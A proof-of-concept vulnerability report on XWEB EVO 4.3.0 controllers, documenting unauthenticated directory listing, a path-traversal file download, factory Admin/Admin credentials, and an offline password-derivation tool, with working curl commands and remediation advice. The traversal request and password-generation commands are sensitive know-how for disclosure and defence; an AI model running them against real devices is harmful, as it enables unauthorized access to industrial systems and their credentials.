# PoC3 — XWEB EVO 4.3.0 read-only file access and default-admin login

- Product/version: XWEB300D EVO 4.3.0, ARM
- Status: read-only behavior validated on an explicitly authorized unit;
  official-package analysis also completed
- Related CVE class: CVE-2021-45427 (originally documented on 3.0.7)
- New CVE assignment: not claimed

Researcher: Ole-k2.

## Privacy and evidence boundary

All personal test-unit identifiers, downloaded files, account databases,
configuration, sessions, addresses, hostnames, and raw responses are excluded.
This report retains only the generalized, reproducible finding and does not
describe any personal remote device.

## Impact

An unauthenticated client can list arbitrary directories and download arbitrary
files through two read-only paths. Downloading the user database can reveal
whether default credentials remain configured. The reviewed factory credential
`Admin`/`Admin` provided an administrative web session in the authorized
validation. This exposes system configuration, firmware executables, update
logic, and key material readable by the web service. No write, delete, or
device-control operation is required.

## Validated behavior

- `upload.cgi` accepted an unauthenticated directory-list action and returned
  setup-directory entries.
- `utility.lua` accepted traversal in a download filename and returned a file
  outside the intended template directory.
- The version file downloaded through this path matched the authorized unit's
  EVO 4.3.0 release.
- The reviewed user database used the factory `Admin` credential, which produced
  an administrative session; the session was closed normally.
- Recovered binaries were compared with official package artifacts. Personal
  recovered binaries and hash manifests are not included here.

## Safe reproduction model

Use these steps only on an explicitly authorized isolated unit. `TARGET` is an
operator-supplied placeholder, not a researcher device. Do not invoke delete,
remove, upload, firmware-update, or device-control actions.

Public version information:

```bash
curl -X POST -H 'Content-Length: 0' "$TARGET/cgi-bin/sysinfo.lua"
```

Directory listing:

```bash
curl --get --data-urlencode action=list \
  --data-urlencode path=/opt/setup "$TARGET/cgi-bin/upload.cgi"
```

Harmless version-file download:

```bash
curl --get --data-urlencode action=download \
  --data-urlencode location=templates \
  --data-urlencode filename=../../../etc/xwebversion.json \
  "$TARGET/cgi-bin/utility.lua"
```

For an offline password-model check, use only the documentation example MAC and
an official recovered `xwpasswd` binary. No device-derived credential is
included. The independent model is:

```bash
python3 tools/xweb_evo_password.py 30 10 26 --mac 00:11:22:33:44:55
python3 tools/xweb_evo_password.py 30 10 26 --mac 00:11:22:33:44:55 --root-password
```

Expected documentation outputs are `O0ANI3` and `xwebdixO0ANI3`.

## Remediation

- Restrict web access to a dedicated management network or VPN and avoid direct
  Internet exposure.
- Change default credentials and review every account for reused or default
  values. Do not expose password databases or recovery files.
- Migrate from end-of-support EVO using Copeland's published upgrade resources;
  no future EVO security patches are promised.
- Add authorization and canonical-path validation to directory/download
  handlers. Reject `..`, absolute paths, and unauthorized sessions before any
  filesystem access.
- Monitor unauthenticated `upload.cgi` and `utility.lua` requests, factory-account
  logins, and downloads of SQLite/configuration files.

## Scope limitation

This PoC does not demonstrate XWEB Pro or E3/SS decryption, third-party
compromise, or a safe production patching process.
